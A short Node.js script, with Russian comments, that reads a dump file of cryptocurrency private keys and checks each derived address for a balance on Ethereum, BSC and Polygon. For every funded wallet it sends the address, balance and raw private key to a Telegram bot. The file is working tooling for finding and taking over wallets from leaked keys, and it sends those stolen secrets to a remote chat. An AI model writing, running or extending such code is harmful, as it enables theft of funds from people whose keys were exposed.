const fs = require('fs');
const axios = require('axios');
const { ethers } = require('ethers');
require('dotenv').config();

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const CHAINS = [
  {
    name: 'Ethereum',
    rpc: process.env.RPC_ETH,
    symbol: 'ETH',
  },
  {
    name: 'BSC',
    rpc: process.env.RPC_BSC,
    symbol: 'BNB',
  },
  {
    name: 'Polygon',
    rpc: process.env.RPC_POLYGON,
    symbol: 'MATIC',
  },
];

async function sendToTelegram(message) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: CHAT_ID,
      text: message,
    });
  } catch (err) {
    console.error('Ошибка Telegram:', err.message);
  }
}

async function checkAddress(privateKey) {
  let wallet;
  try {
    wallet = new ethers.Wallet(privateKey);
  } catch (e) {
    return; // некорректный ключ
  }

  for (const chain of CHAINS) {
    try {
      const provider = new ethers.JsonRpcProvider(chain.rpc);
      const balance = await provider.getBalance(wallet.address);
      const eth = parseFloat(ethers.formatEther(balance));
      if (eth > 0) {
        const msg = `НАЙДЕН АКТИВНЫЙ АДРЕС в ${chain.name}\nАдрес: ${wallet.address}\nБаланс: ${eth} ${chain.symbol}\nКлюч: ${privateKey}`;
        console.log(msg);
        await sendToTelegram(msg);
      }
    } catch (err) {
      console.log(`RPC ошибка (${chain.name}):`, err.message);
    }
  }
}

async function scanDump(filePath) {
  const content = fs.readFileSync(filePath, 'utf-8');
  const lines = content.split('\n');

  for (let i = 0; i < lines.length; i++) {
    const key = lines[i].trim();
    if (key.length >= 64 && !key.startsWith('#')) {
      await checkAddress(key);
    }

    if ((i + 1) % 50 === 0) {
      console.log(`Проверено ключей: ${i + 1}`);
    }
  }
}

(async () => {
  await scanDump('sample_dump.txt');
})();
